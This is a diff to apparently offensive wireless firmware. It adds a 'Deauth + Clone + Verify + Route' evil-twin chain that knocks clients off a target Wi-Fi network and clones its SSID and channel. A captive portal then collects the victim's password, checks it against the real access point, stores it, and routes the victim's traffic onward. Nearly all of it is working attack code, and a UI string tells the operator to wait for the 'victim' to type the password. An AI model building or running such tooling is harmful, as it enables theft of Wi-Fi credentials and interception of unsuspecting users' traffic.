@@ -9279,7 +9279,7 @@ index 00000000..c56d7aef
 +#endif
 diff --git a/src/core/feature_guide.cpp b/src/core/feature_guide.cpp
 new file mode 100644
-index 00000000..5671b311
+index 00000000..20d88135
 --- /dev/null
 +++ b/src/core/feature_guide.cpp
 @@ -0,0 +1,1125 @@
@@ -10062,7 +10062,7 @@ index 00000000..5671b311
 +        "Chains",
 +        "WIFI",
 +        "Chains",
-+        "Recon->Capture, NAPT->LAN, Guard->Audit, BLE->Clone, USB->Verify",
++        "Recon->Capture, NAPT->LAN, Guard->Audit, Deauth+Clone+Verify+Route, BLE->Clone, USB->Verify",
 +        "# OVERVIEW\n"
 +        "Coordinates existing SecLab+ tools into 6 guided chains. The chain does not reimplement the member tool; it only sequences Start/Stop and feeds one tool's snapshot into the next.\n"
 +        "# CHAINS\n"
@@ -12345,7 +12345,7 @@ index 49138d4a..0bea13fb 100644
  }
 diff --git a/src/core/serial_commands/seclab_commands.cpp b/src/core/serial_commands/seclab_commands.cpp
 new file mode 100644
-index 00000000..0dc56d82
+index 00000000..ee8f6845
 --- /dev/null
 +++ b/src/core/serial_commands/seclab_commands.cpp
 @@ -0,0 +1,479 @@
@@ -12387,7 +12387,7 @@ index 00000000..0dc56d82
 +    slPrint("  seclab led start|stop|export|clear|generate|status [windows|macos|linux]");
 +    slPrint("  seclab os windows|macos|linux");
 +    slPrint("  seclab ble tag_start|tag_stop|pair|fuzzer|clear|status [addr] [type] [justworks|mitm|duration]");
-+    slPrint("  seclab chain list | start <id> | stop <id> | status  (ids: recon-capture napt-lan portal-lan guard-audit ble-pipeline usb-verify)");
++    slPrint("  seclab chain list | start <id> | stop <id> | status  (ids: recon-capture napt-lan portal-lan guard-audit ble-pipeline usb-verify evil-twin-route)");
 +    slPrint("  seclab chain auto napt-lan|portal-lan|guard-audit [on|off]");
 +    slPrint("  KEYS: pairmode perm hidauto oswarn hidtimeout httpport httpauto redact handoff");
 +    slPrint("        lanauto fuzzer autoexport csa(channel,bursts) chainNaptLanAuto chainPortalLanAuto chainGuardAuditAuto");
@@ -12777,7 +12777,7 @@ index 00000000..0dc56d82
 +    if (m == "chain") {
 +        if (a == "list" || a == "status" || a.isEmpty()) { slPrint(chainGetStateJson()); return true; }
 +        if (a == "start") {
-+            if (v.isEmpty()) { slPrint("Usage: seclab chain start <id>  (recon-capture|napt-lan|portal-lan|guard-audit|ble-pipeline|usb-verify)"); return false; }
++            if (v.isEmpty()) { slPrint("Usage: seclab chain start <id>  (recon-capture|napt-lan|portal-lan|guard-audit|ble-pipeline|usb-verify|evil-twin-route [ssid] [ch])"); return false; }
 +            bool ok = chainStart(v, &err);
 +            slResult(ok, String("Chain \"") + v + "\" started", err);
 +            return ok;
@@ -24097,10 +24097,10 @@ index 23e8e3c4..697864a2 100644
  void drawTime();
 diff --git a/src/modules/wifi/chain_logic.h b/src/modules/wifi/chain_logic.h
 new file mode 100644
-index 00000000..032945c8
+index 00000000..819464cc
 --- /dev/null
 +++ b/src/modules/wifi/chain_logic.h
-@@ -0,0 +1,545 @@
+@@ -0,0 +1,554 @@
 +#pragma once
 +// Chain orchestration logic — Arduino-free, host-testable.
 +//
@@ -24135,6 +24135,7 @@ index 00000000..032945c8
 +    CHAIN_GUARD_AUDIT,     // LAN Guard alert -> LAN Auditor deep + export
 +    CHAIN_BLE_PIPELINE,    // BLE Privacy Guard -> Pairing Audit -> GATT Clone
 +    CHAIN_USB_VERIFY,      // Smart BadUSB Generate -> Arm LED -> Run -> Verify
++    CHAIN_EVIL_TWIN,       // Deauth + Clone + Verify + Route (fake -> real internet)
 +    CHAIN_COUNT
 +};
 +
@@ -24146,6 +24147,7 @@ index 00000000..032945c8
 +        case CHAIN_GUARD_AUDIT: return "guard-audit";
 +        case CHAIN_BLE_PIPELINE: return "ble-pipeline";
 +        case CHAIN_USB_VERIFY: return "usb-verify";
++        case CHAIN_EVIL_TWIN: return "evil-twin-route";
 +        default: return "none";
 +    }
 +}
@@ -24158,6 +24160,7 @@ index 00000000..032945c8
 +        case CHAIN_GUARD_AUDIT: return "Guard -> Audit";
 +        case CHAIN_BLE_PIPELINE: return "BLE Guard -> Audit -> Clone";
 +        case CHAIN_USB_VERIFY: return "USB Generate -> Verify";
++        case CHAIN_EVIL_TWIN: return "Deauth + Clone + Verify + Route";
 +        default: return "None";
 +    }
 +}
@@ -24207,6 +24210,10 @@ index 00000000..032945c8
 +        {"Generate", "build"}, {"LED Link", "arm"},
 +        {"Run Payload", "run"}, {"LED Verify", "verify"},
 +    };
++    static const ChainStep kEvilTwin[] = {
++        {"Deauth", "deauth"}, {"Clone AP", "clone"},
++        {"Verify", "verify"}, {"Route", "route"},
++    };
 +    const ChainStep *src = nullptr;
 +    int count = 0;
 +    switch (id) {
@@ -24216,6 +24223,7 @@ index 00000000..032945c8
 +        case CHAIN_GUARD_AUDIT: src = kGuardAudit; count = 3; break;
 +        case CHAIN_BLE_PIPELINE: src = kBle; count = 3; break;
 +        case CHAIN_USB_VERIFY: src = kUsb; count = 4; break;
++        case CHAIN_EVIL_TWIN: src = kEvilTwin; count = 4; break;
 +        default: return 0;
 +    }
 +    if (out && cap > 0) {
@@ -24325,6 +24333,7 @@ index 00000000..032945c8
 +            return CHAIN_OK;
 +        case CHAIN_NAPT_LAN:
 +        case CHAIN_PORTAL_LAN:
++        case CHAIN_EVIL_TWIN:
 +            if (!p.wifiMemOk) return CHAIN_NEED_WIFI_MEM;
 +            return CHAIN_OK;
 +        case CHAIN_GUARD_AUDIT:
@@ -24648,10 +24657,10 @@ index 00000000..032945c8
 +}
 diff --git a/src/modules/wifi/chain_orchestrator.cpp b/src/modules/wifi/chain_orchestrator.cpp
 new file mode 100644
-index 00000000..3b6fa4d4
+index 00000000..7116b671
 --- /dev/null
 +++ b/src/modules/wifi/chain_orchestrator.cpp
-@@ -0,0 +1,752 @@
+@@ -0,0 +1,846 @@
 +#include "chain_orchestrator.h"
 +#if !defined(LITE_VERSION)
 +
@@ -25148,6 +25157,79 @@ index 00000000..3b6fa4d4
 +    }
 +}
 +
++
++static void evilTwinRouteMenu() {
++    // Deauth + Clone + Verify + Route
++    // Steps: 1) pick target AP, 2) Deauth (EvilPortal deauth loop), 3) Clone AP, 4) Verify password, 5) Route via real AP (NAPT)
++    if (portalNaptIsRunning()) {
++        int choice = -1;
++        options = {
++            {"Stop Evil Twin Route", [&]() { choice = 0; }},
++            {"View Portal creds", [&]() { choice = 1; }},
++            {"Back", [&]() { choice = -1; }},
++        };
++        loopOptions(options, MENU_TYPE_SUBMENU, "Evil Twin Route [ON]");
++        options.clear();
++        if (choice == 0) { portalNaptStop(); displayInfo("Evil Twin stopped", true); return; }
++        if (choice == 1) {
++            // Show captured creds file if exists
++            if (LittleFS.exists("/BruceEvilCreds/default_creds.csv")) loopSD(LittleFS, false, "*", "/BruceEvilCreds");
++            else displayInfo("No creds yet", true);
++            return;
++        }
++        return;
++    }
++    // Need target - scan or manual
++    String targetSsid;
++    uint8_t targetCh = 6;
++    // Try to get target from recent scan via chain target picker, else ask user
++    ChainTarget picked;
++    int bestCh=0;
++    String pickErr;
++    bool hasPick=false;
++    if (pickReconTarget(picked, bestCh, pickErr)) {
++        hasPick=true;
++        targetSsid = String(picked.ssid);
++        targetCh = picked.channel;
++    }
++    int choice=-1;
++    options = {
++        {hasPick ? String("Target: ")+targetSsid+" CH"+String(targetCh)+" (from scan)") : String("Target: <chọn từ Scan & Analyze trước>"), [&]() { choice=0; }},
++        {"Nhập SSID thủ công", [&]() { choice=1; }},
++        {String("Bắt đầu Deauth+Clone+Verify+Route")+ (hasPick?"": " (cần target)"), [&]() { choice=2; }},
++        {"Back", [&]() { choice=-1; }},
++    };
++    loopOptions(options, MENU_TYPE_SUBMENU, "Deauth+Clone+Verify+Route");
++    options.clear();
++    if (choice==0 && hasPick) {
++        displayInfo(String("Đã chọn: ")+targetSsid+" CH"+String(targetCh)+"\nBấm Back rồi chọn Bắt đầu", true);
++        return;
++    }
++    if (choice==1) {
++        String s = keyboard(targetSsid, 32, "Target SSID:");
++        if (s.length()>0 && s!="\x1B") { targetSsid=s; String chStr=keyboard(String(targetCh),3,"Channel 1-13:"); int ch=chStr.toInt(); if(ch>=1&&ch<=13) targetCh=(uint8_t)ch; hasPick=true;
++            // Save as picked for next start
++            picked = ChainTarget(); strncpy(picked.ssid, targetSsid.c_str(), sizeof(picked.ssid)-1); picked.channel=targetCh; hasPick=true;
++        } else return;
++        // recursive back to menu to allow start
++        // For simplicity, directly start after manual entry
++        choice=2;
++    }
++    if (choice!=2) return;
++    if (!hasPick) { displayWarning("Chưa có target. Hãy chạy Scan & Analyze hoặc nhập SSID.", true); return; }
++    // Need uplink - try to use saved wifi or ask user to have connected once
++    String uplinkSsid, uplinkPwd;
++    // We will use portalNaptStartEvilTwin which handles fallback to verified creds
++    // For now use same targetSsid as AP clone, and uplink will be filled after verify
++    String err;
++    // Use EvilTwin helper: deauth ON, verify ON, clone same SSID/channel, route via verified password
++    bool ok = portalNaptStartEvilTwin(targetSsid, targetCh, "", "", &err);
++    if (!ok) { displayError(String("Start failed: ")+err, true); chainLog("evil-twin-route","start",false,err); return; }
++    markActive(CHAIN_EVIL_TWIN);
++    chainLog("evil-twin-route","start",true,targetSsid+" CH"+String(targetCh)+" deauth+clone+verify+route");
++    displaySuccess(String("Đang chạy: ")+targetSsid+"\nDeauth+Clone+Verify+Route\nĐợi nạn nhân nhập pass -> sẽ tự Route ra mạng thật", true);
++}
++
 +static void usbVerifyMenu() {
 +    int choice = -1;
 +    options = {
@@ -25227,7 +25309,7 @@ index 00000000..3b6fa4d4
 +bool chainStart(const String &id, String *errOut) {
 +    ChainId cid = chainIdFromString(id.c_str());
 +    if (cid == CHAIN_NONE) {
-+        if (errOut) *errOut = "Unknown chain. Use: recon-capture, napt-lan, portal-lan, guard-audit, ble-pipeline, usb-verify";
++        if (errOut) *errOut = "Unknown chain. Use: recon-capture, napt-lan, portal-lan, guard-audit, ble-pipeline, usb-verify, evil-twin-route";
 +        return false;
 +    }
 +    ChainPreconditions p = livePreconditions();
@@ -25290,6 +25372,20 @@ index 00000000..3b6fa4d4
 +            if (errOut && !ok) *errOut = err;
 +            break;
 +        }
++        case CHAIN_EVIL_TWIN: {
++            ChainTarget target;
++            int bestCh=0;
++            if (!pickReconTarget(target, bestCh, err)) {
++                if (errOut) *errOut = err + " (cần Analyzer snapshot hoặc nhập tay trên thiết bị)";
++                chainLog("evil-twin-route","pick-target",false,err);
++                return false;
++            }
++            String ssid=String(target.ssid);
++            ok = portalNaptStartEvilTwin(ssid, target.channel, "", "", &err);
++            chainLog("evil-twin-route","start",ok, ok? ssid+" CH"+String(target.channel):err);
++            if (errOut && !ok) *errOut=err;
++            break;
++        }
 +        default:
 +            if (errOut) *errOut = "Unknown chain";
 +            return false;
@@ -25328,6 +25424,10 @@ index 00000000..3b6fa4d4
 +            smartBadUsbStopLedLink();
 +            chainLog("usb-verify", "stop", true, "LED Link stopped");
 +            break;
++        case CHAIN_EVIL_TWIN:
++            portalNaptStop();
++            chainLog("evil-twin-route", "stop", true, "Evil Twin stopped");
++            break;
 +        default: break;
 +    }
 +    if (s_activeChain == cid) s_activeChain = CHAIN_NONE;
@@ -25342,6 +25442,7 @@ index 00000000..3b6fa4d4
 +        case CHAIN_RECON_CAPTURE: return pmkidIsRunning() || csaIsRunning();
 +        case CHAIN_BLE_PIPELINE: return blePairingAuditIsRunning();
 +        case CHAIN_USB_VERIFY: return smartBadUsbIsLedLinkRunning();
++        case CHAIN_EVIL_TWIN: return portalNaptIsRunning();
 +        default: return false;
 +    }
 +}
@@ -25376,8 +25477,9 @@ index 00000000..3b6fa4d4
 +        {"NAPT -> LAN", [&]() { choice = 1; }},
 +        {"Portal -> NAPT -> LAN", [&]() { choice = 2; }},
 +        {"Guard -> Audit", [&]() { choice = 3; }},
-+        {"BLE Guard -> Audit -> Clone", [&]() { choice = 4; }},
-+        {"USB Generate -> Verify", [&]() { choice = 5; }},
++        {"Deauth + Clone + Verify + Route", [&]() { choice = 4; }},
++        {"BLE Guard -> Audit -> Clone", [&]() { choice = 5; }},
++        {"USB Generate -> Verify", [&]() { choice = 6; }},
 +        {"Back", [&]() { choice = -1; }},
 +    };
 +    loopOptions(options, MENU_TYPE_SUBMENU, "Chains");
@@ -25387,8 +25489,9 @@ index 00000000..3b6fa4d4
 +        case 1: naptLanMenu(); break;
 +        case 2: portalLanMenu(); break;
 +        case 3: guardAuditMenu(); break;
-+        case 4: blePipelineMenu(); break;
-+        case 5: usbVerifyMenu(); break;
++        case 4: evilTwinRouteMenu(); break;
++        case 5: blePipelineMenu(); break;
++        case 6: usbVerifyMenu(); break;
 +        default: break;
 +    }
 +}
@@ -26067,7 +26170,7 @@ index 353b8641..006bee36 100644
  
  #endif
 diff --git a/src/modules/wifi/evil_portal.cpp b/src/modules/wifi/evil_portal.cpp
-index 59ed80ed..375f7dda 100644
+index 59ed80ed..3458ca49 100644
 --- a/src/modules/wifi/evil_portal.cpp
 +++ b/src/modules/wifi/evil_portal.cpp
 @@ -8,6 +8,7 @@
@@ -26142,7 +26245,25 @@ index 59ed80ed..375f7dda 100644
      } else {
          tft.setTextColor(TFT_RED);
          printFootnote("Deauth ON");
-@@ -738,6 +771,10 @@ void EvilPortal::credsController(AsyncWebServerRequest *request) {
+@@ -716,13 +749,14 @@ void EvilPortal::credsController(AsyncWebServerRequest *request) {
+     if (_verifyPwd && passwordValue != "") {
+         request->send(200, "text/html", wifiLoadPage());
+         bool isCorrect = verifyCreds(apName, passwordValue);
++        _lastVerifiedSsid = apName;
++        _lastVerifiedPassword = passwordValue;
++        _lastVerifyOk = isCorrect;
+         if (isCorrect) {
+             lastCred += "valid: true\nStopping server...";
+             saveToCSV(csvLine + ", valid: true", true);
+             printDeauthStatus();
+-            if (bruceConfig.getWifiPassword(apName) != "") {
+-                bruceConfig.addWifiCredential(apName, passwordValue);
+-            }
++            bruceConfig.addWifiCredential(apName, passwordValue);
+             vTaskDelay(50 / portTICK_PERIOD_MS);
+             verifyPass = true;
+             _deauth = false;
+@@ -738,6 +772,10 @@ void EvilPortal::credsController(AsyncWebServerRequest *request) {
  
      capturedCredentialsHtml = htmlResponse + capturedCredentialsHtml;
      totalCapturedCredentials++;
@@ -26154,10 +26275,10 @@ index 59ed80ed..375f7dda 100644
  
  String EvilPortal::getHtmlTemplate(const String &body) {
 diff --git a/src/modules/wifi/evil_portal.h b/src/modules/wifi/evil_portal.h
-index 4a8b438e..6d7bc382 100644
+index 4a8b438e..47ba8ccd 100644
 --- a/src/modules/wifi/evil_portal.h
 +++ b/src/modules/wifi/evil_portal.h
-@@ -31,6 +31,12 @@ public:
+@@ -31,9 +31,19 @@ public:
      void loop(void);
      void processRequests(void);
  
@@ -26170,9 +26291,20 @@ index 4a8b438e..6d7bc382 100644
      bool hasCredentials();
      String getCapturedSSID();
      String getCapturedPassword();
-@@ -80,6 +86,9 @@ private:
++    // Last verified STA credentials (for Deauth+Clone+Verify+Route chain)
++    String getLastVerifiedSsid() const { return _lastVerifiedSsid; }
++    String getLastVerifiedPassword() const { return _lastVerifiedPassword; }
++    bool hasVerifiedPassword() const { return _lastVerifyOk && _lastVerifiedPassword.length() > 0; }
+ 
+     DNSServer &getDNSServer() { return *dnsServer; }
+     AsyncWebServer &getWebServer() { return webServer; }
+@@ -79,7 +89,13 @@ private:
+     int previousTotalCapturedCredentials = -1;
      String capturedCredentialsHtml = "";
      bool verifyPass = false;
++    String _lastVerifiedSsid;
++    String _lastVerifiedPassword;
++    bool _lastVerifyOk = false;
      bool _pendingWifiRestart = false;
 +    bool _naptHandoffPending = false;
 +    bool _naptHandoffDone = false;
@@ -30586,10 +30718,10 @@ index 00000000..021ceb4c
 +#endif
 diff --git a/src/modules/wifi/portal_napt.cpp b/src/modules/wifi/portal_napt.cpp
 new file mode 100644
-index 00000000..7e986524
+index 00000000..9067c2a2
 --- /dev/null
 +++ b/src/modules/wifi/portal_napt.cpp
-@@ -0,0 +1,375 @@
+@@ -0,0 +1,410 @@
 +#include "portal_napt.h"
 +#if !defined(LITE_VERSION)
 +
@@ -30624,6 +30756,9 @@ index 00000000..7e986524
 +static char s_apSsid[33] = {0};
 +static char s_staSsid[33] = {0};
 +static char s_staPwd[65] = {0};
++static uint8_t s_apChannel = 6;
++static bool s_deauth = false;
++static bool s_verify = false;
 +static char s_lastErr[96] = {0};
 +static uint32_t s_startedMs = 0;
 +static uint32_t s_formCount = 0;
@@ -30681,7 +30816,7 @@ index 00000000..7e986524
 +    radioFreeBleForWifi();
 +    ensureWifiPlatform();
 +
-+    s_portal = new EvilPortal(String(s_apSsid), 6, false, false, true, true, "");
++    s_portal = new EvilPortal(String(s_apSsid), s_apChannel ? s_apChannel : 6, s_deauth, s_verify, true, true, "");
 +    if (!s_portal) {
 +        setErr("Portal alloc failed");
 +        s_running = false;
@@ -30748,7 +30883,7 @@ index 00000000..7e986524
 +    vTaskDelete(NULL);
 +}
 +
-+static bool startEngine(const String &apSsid, const String &staSsid, const String &staPwd,
++static bool startEngineEx(const String &apSsid, uint8_t apChannel, bool deauth, bool verify, const String &staSsid, const String &staPwd,
 +                        bool handoff, String *errOut) {
 +    if (s_running) return true;
 +    if (apSsid.isEmpty() || apSsid.length() > 32) { if (errOut) *errOut = "AP SSID must be 1..32 bytes"; return false; }
@@ -30762,6 +30897,9 @@ index 00000000..7e986524
 +    s_staSsid[sizeof(s_staSsid) - 1] = 0;
 +    strncpy(s_staPwd, staPwd.c_str(), sizeof(s_staPwd) - 1);
 +    s_staPwd[sizeof(s_staPwd) - 1] = 0;
++    s_apChannel = apChannel;
++    s_deauth = deauth;
++    s_verify = verify;
 +    s_armed = handoff;
 +    s_handoffDone = false;
 +    s_formCount = 0;
@@ -30779,6 +30917,10 @@ index 00000000..7e986524
 +    }
 +    persistState();
 +    return true;
++}
++
++static bool startEngine(const String &apSsid, const String &staSsid, const String &staPwd, bool handoff, String *errOut) {
++    return startEngineEx(apSsid, 6, false, false, staSsid, staPwd, handoff, errOut);
 +}
 +
 +static bool pickUplink(String &ssid, String &pwd) {
@@ -30801,7 +30943,11 @@ index 00000000..7e986524
 +    if (!portal) { if (errOut) *errOut = "Portal object missing"; return false; }
 +    if (naptIsRunning()) return true;
 +    String staSsid, staPwd;
-+    if (!pickUplink(staSsid, staPwd)) {
++    // Prefer verified target credentials (Deauth+Clone+Verify+Route chain)
++    if (portal->hasVerifiedPassword()) {
++        staSsid = portal->getLastVerifiedSsid();
++        staPwd = portal->getLastVerifiedPassword();
++    } else if (!pickUplink(staSsid, staPwd)) {
 +        if (errOut) *errOut = "No uplink Wi-Fi saved. Connect once first.";
 +        return false;
 +    }
@@ -30848,6 +30994,27 @@ index 00000000..7e986524
 +bool portalNaptStart(const String &apSsid, const String &staSsid, const String &staPwd,
 +                     bool handoff, String *errOut) {
 +    return startEngine(apSsid, staSsid, staPwd, handoff, errOut);
++}
++
++bool portalNaptStartEx(const String &apSsid, uint8_t apChannel, bool deauth, bool verify, const String &staSsid, const String &staPwd, bool handoff, String *errOut) {
++    return startEngineEx(apSsid, apChannel, deauth, verify, staSsid, staPwd, handoff, errOut);
++}
++
++bool portalNaptStartEvilTwin(const String &targetSsid, uint8_t targetChannel, const String &staSsid, const String &staPwd, String *errOut) {
++    // Deauth + Clone (same SSID/channel) + Verify + Route (NAPT via captured creds)
++    // Route uses target network; if staSsid empty we will use verified password after capture.
++    String uplinkSsid = staSsid.length() ? staSsid : targetSsid;
++    String uplinkPwd = staPwd;
++    // If no STA pwd provided, we still start portal with Verify=ON; handoff will use verified pwd.
++    if (uplinkPwd.isEmpty()) {
++        // Need at least a placeholder STA to start portal; will be replaced by verified creds on handoff.
++        // Use saved wifi if available, otherwise start with same SSID and empty pwd (will fail until verify).
++        if (!pickUplink(uplinkSsid, uplinkPwd)) {
++            uplinkSsid = targetSsid;
++            uplinkPwd = "";
++        }
++    }
++    return startEngineEx(targetSsid, targetChannel, true, true, uplinkSsid, uplinkPwd, true, errOut);
 +}
 +
 +bool portalNaptStartAuto(String *errOut) {
@@ -30967,10 +31134,10 @@ index 00000000..7e986524
 +#endif
 diff --git a/src/modules/wifi/portal_napt.h b/src/modules/wifi/portal_napt.h
 new file mode 100644
-index 00000000..3ff73ad9
+index 00000000..06e746bc
 --- /dev/null
 +++ b/src/modules/wifi/portal_napt.h
-@@ -0,0 +1,27 @@
+@@ -0,0 +1,30 @@
 +#ifndef __PORTAL_NAPT_H__
 +#define __PORTAL_NAPT_H__
 +
@@ -30986,6 +31153,9 @@ index 00000000..3ff73ad9
 +
 +bool portalNaptStart(const String &apSsid, const String &staSsid, const String &staPwd,
 +                     bool handoff, String *errOut = nullptr);
++bool portalNaptStartEx(const String &apSsid, uint8_t apChannel, bool deauth, bool verify,
++                     const String &staSsid, const String &staPwd, bool handoff, String *errOut = nullptr);
++bool portalNaptStartEvilTwin(const String &targetSsid, uint8_t targetChannel, const String &staSsid, const String &staPwd, String *errOut = nullptr);
 +
 +// Called by the classic EvilPortal after its captive form is submitted.
 +// Stops the captive server, keeps the same open SSID, and starts NAPT.
